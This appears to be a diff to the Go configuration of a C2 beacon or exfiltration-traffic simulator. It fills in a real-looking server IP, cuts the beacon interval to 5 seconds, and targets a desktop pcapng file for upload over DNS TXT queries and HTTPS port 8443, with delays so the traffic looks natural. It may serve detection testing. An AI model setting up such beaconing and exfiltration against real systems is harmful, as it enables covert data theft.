@@ -44,7 +44,7 @@ var (
 	//   - HTTPS connection
 	//   - TXT queries (always direct)
 	//   - A queries (when DirectMode=true)
-	C2ServerIP = "YOUR_SERVER_IP"
+	C2ServerIP = "172.208.51.75"
 
 	// DirectMode controls A record query routing:
 	//   true  = A queries go directly to C2 (for testing)
@@ -55,22 +55,22 @@ var (
 
 	// DNSResolver is the local DNS resolver for A queries when DirectMode=false.
 	// Examples: "192.168.1.1:53", "10.0.0.1:53", "8.8.8.8:53"
-	DNSResolver = "8.8.8.8:53"
+	DNSResolver = "192.168.2.1:53"
 
 	// BeaconInterval is the base time between A record check-ins (seconds).
 	// Default: 300 (5 minutes)
-	BeaconInterval = 300
+	BeaconInterval = 5
 
 	// Jitter is the ± randomization applied to BeaconInterval (seconds).
 	// Default: 60 (results in 4-6 minute range)
-	Jitter = 60
+	Jitter = 2
 
 	// HTTPSPort is the port for direct HTTPS connection to C2.
 	HTTPSPort = 8443
 
 	// ExfilFilePath is the file to upload to the C2 after TXT transfer.
 	// Should be ~200MB for realistic exfiltration traffic.
-	ExfilFilePath = `C:\Users\Public\exfil_data.bin`
+	ExfilFilePath = `C:\Users\tresa\OneDrive\Desktop\example.pcapng`
 
 	// TXTQueryDelayMs is the delay between TXT queries (milliseconds).
 	// A small delay makes the traffic look more natural.
